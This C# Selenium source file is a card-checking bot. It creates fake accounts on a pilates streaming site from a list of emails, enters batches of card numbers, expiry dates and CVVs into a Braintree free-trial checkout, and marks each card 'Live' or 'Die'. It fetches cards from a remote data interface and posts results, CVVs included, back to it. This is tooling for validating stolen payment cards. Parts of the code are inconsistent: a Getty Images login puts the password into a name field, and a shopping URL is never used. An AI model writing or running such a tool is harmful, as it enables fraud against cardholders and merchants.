using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System.Threading.Tasks;
using System.IO;
using Newtonsoft.Json.Linq;

namespace BetBasketBallChecker
{
    class CompareAccess: CompareClass
    {
        protected List<string> m_mailList = new List<string>() { };
        int m_mainIndex = 0;
        public CompareAccess(Form1 wnd): base(wnd)
        {
            load = new WebDriverWait(driver, TimeSpan.FromSeconds(100));
            readProxyList();
        }

        private void readProxyList()
        {
            using (StreamReader sr = new StreamReader("email_list.txt"))
            {
                string line;
                while ((line = sr.ReadLine()) != null)
                {
                    m_mailList.Add(line);
                }
            }

        }

        protected override void login()
        {
            log("error", "Enter Login");
            driver.Navigate().GoToUrl("https://www.gettyimages.com/sign-in?returnurl=%2Flicense%2F940915736");
            load.Until(ExpectedConditions.ElementExists(By.XPath("//input[@name='first_name']")));
            inputTexttoElement("//input[@name='first_name']", m_userName);
            inputTexttoElement("//input[@name='last_name", m_password);
            var loginBtn = driver.FindElementByXPath("//button[@id='sign_in']");
            loginBtn.Click();
            Thread.Sleep(1000);
        }

        protected override void addCart(String cartUrl)
        {
            driver.Navigate().GoToUrl("https://www.pilatesanytime.com/account/new_account.cfm");
            load.Until(ExpectedConditions.ElementExists(By.XPath("//input[@name='first_name']")));
            string email = m_mailList.ElementAt(m_mainIndex);
            m_mainIndex++;
            if (m_mainIndex >= m_mailList.Count)
            { m_mainIndex = 0; }
            string firstName = email.Split('@')[0];
            int length = firstName.Length;
            string secondName = firstName.Substring(length>4?3:1);
            firstName = firstName.Substring(0, length > 4 ? 3 : 1);

            inputTexttoElement("//input[@name='first_name']", firstName);
            firstName = email.Split('@')[0];
            email = Shuffle(firstName) + "@" + email.Split('@')[1];

            inputTexttoElement("//input[@name='last_name']", secondName);
            inputTexttoElement("//input[@name='email']", email);
            inputTexttoElement("//input[@name='pw']", "shfwkkwew");
            driver.FindElementById("terms_ok").Click();
            driver.FindElementById("news_ok").Click();
            driver.FindElementByXPath("//button[@name='submit_step_one']").Click();
        }

        protected override int checkOut(String cartUrl, String number, String month, String year, String cvv)
        {
            log("error", "Enter Checkout " + number);
            try
            {
                load.Until(ExpectedConditions.ElementExists(By.XPath("//iframe[@id='braintree-hosted-field-number']")));
            }
            catch (Exception ex) { }

            var iframe1 = driver.FindElement(By.Id("braintree-hosted-field-number"));
            driver.SwitchTo().Frame(iframe1);
            load.Until(ExpectedConditions.ElementExists(By.XPath("//input[@id='credit-card-number']")));
            var element1 = driver.FindElementByXPath("//input[@id='credit-card-number']");
            element1.Clear();
            element1.SendKeys(number);
            driver.SwitchTo().ParentFrame();

            iframe1 = driver.FindElement(By.Id("braintree-hosted-field-expirationMonth"));
            driver.SwitchTo().Frame(iframe1);
            load.Until(ExpectedConditions.ElementExists(By.XPath("//input[@id='expiration-month']")));
            element1 = driver.FindElementByXPath("//input[@id='expiration-month']");
            element1.Clear();
            element1.SendKeys(month);
            driver.SwitchTo().ParentFrame();

            iframe1 = driver.FindElement(By.Id("braintree-hosted-field-expirationYear"));
            driver.SwitchTo().Frame(iframe1);
            load.Until(ExpectedConditions.ElementExists(By.XPath("//input[@id='expiration-year']")));
            element1 = driver.FindElementByXPath("//input[@id='expiration-year']");
            element1.Clear();
            element1.SendKeys(year);
            driver.SwitchTo().ParentFrame();

            iframe1 = driver.FindElement(By.Id("braintree-hosted-field-cvv"));
            driver.SwitchTo().Frame(iframe1);
            load.Until(ExpectedConditions.ElementExists(By.XPath("//input[@id='cvv']")));
            element1 = driver.FindElementByXPath("//input[@id='cvv']");
            element1.Clear();
            element1.SendKeys(cvv);
            driver.SwitchTo().ParentFrame();


            var trialBtn = driver.FindElementByXPath("//button[text()='Begin Free Trial']");
            trialBtn.Click();
            var loading = driver.FindElementByXPath("//div[@id='pleaseWaitModal']");
            var i = 0;
            try
            {
                while (!loading.Displayed)
                {
                    i++;
                    Thread.Sleep(20);
                    if (i > delayCount) break;
                }
            }
            catch (Exception ex)
            {
            }

            i = 0;
            try
            {
                while (loading.Displayed)
                {
                    i++;
                    Thread.Sleep(20);
                    if (i > delayCount) break;
                }
            }
            catch (Exception ex)
            {
            }
            try
            {
                driver.FindElementByXPath("//div[contains(@class, 'panel panel-warning')]");
                driver.FindElementByXPath("//button[@class='btn btn-lg btn-warning']").Click();
                return (int)CheckResult.Error;
            }
            catch (Exception ex)
            {
                while (true)
                {
                    try
                    {
                        addCart(cartUrl);
                        break;
                    }
                    catch (Exception ex1)
                    {
                    }

                }
                return (int)CheckResult.Success;
            }
        }
        protected void clickPaymentBtn()
        {
            try
            {
                load.Until(ExpectedConditions.ElementExists(By.XPath("//button[@id='add_payment']")));
                var loginBtn = driver.FindElementByXPath("//button[@id='add_payment']");
                js.ExecuteScript("arguments[0].scrollIntoView()", loginBtn);
                loginBtn.Click();
            }
            catch (Exception exx)
            { }
        }

        protected override void startCompare(String cartUrl,string data)
        {
            cartUrl = "https://global.accessorize.com/en-us/view/product/global_catalog/acc_5,acc_5.20/4800464000?skipRedirection=true&skipRedirection=true";
            while (true)
            {
                try
                {
                    addCart(cartUrl);
                    break;
                }
                catch (Exception ex)
                {
                }

            }

            while (true)
            {
                try
                {
                    m_dataList = m_interface.getDataList(3);
                }
                catch (Exception ex)
                {
                    log("error", "m_interface.getDataList" + ex.Message);
                }
                if (m_dataList.Count < 1)
                {
                    log("error", "Data Length 0");
                    Thread.Sleep(20000);
                    continue;
                }
                List<Dictionary<string, string>> checkresult = new List<Dictionary<string, string>>();
               
                foreach (Dictionary<string, string> item in m_dataList)
                {
                    List<Dictionary<string, string>> temp1 = new List<Dictionary<string, string>>();
                    Dictionary<string, string> temp = new Dictionary<string, string>();
                    int ret = 0;
                    while (true)
                    {
                        try
                        {
                            ret = checkOut(cartUrl, item["number"], item["month"], item["year"], item["cvv"].Substring(0, 3));
                            break;
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                    
                    if (ret == (int)CheckResult.Success)
                    {
                        m_wnd.writeResult(String.Format("{0} {1}/{2} {3}: {4}", item["number"], item["month"], item["year"], item["cvv"], "Live"));

                        int cardType = 1;
                        if (getCardType(item["number"]) == (int)CardType.Visa)
                        {
                            log("live", String.Format("{0} {1}/{2} {3}: {4}", item["number"], item["month"], item["year"], item["cvv"], "Live") + " Visa");
                        }
                        else
                        {
                            cardType = 2;
                            log("live", String.Format("{0} {1}/{2} {3}: {4}", item["number"], item["month"], item["year"], item["cvv"], "Live") + " Master");
                        }
                        temp.Add("number", item["number"]);
                        temp.Add("status", "8");
                        temp.Add("cvv", item["cvv"].Substring(0, 3));
                        temp.Add("country", "");
                        temp.Add("family", cardType.ToString());
                        temp1.Add(temp);
                        postResult(temp1);
                    }
                    else
                    {
                        log("error", String.Format("{0} {1}/{2} {3}: {4}", item["number"], item["month"], item["year"], item["cvv"], "Die"));
                        m_wnd.writeResult(String.Format("{0} {1}/{2} {3}: {4}", item["number"], item["month"], item["year"], item["cvv"], "Die"));
                        temp.Add("number", item["number"]);
                        temp.Add("status", "2");
                        temp.Add("country", "");
                        temp.Add("cvv", item["cvv"].Substring(0, 3));
                        temp.Add("family", "0");
                        checkresult.Add(temp);
                    }
                }

                postResult(checkresult);
            }
        }
    }
}
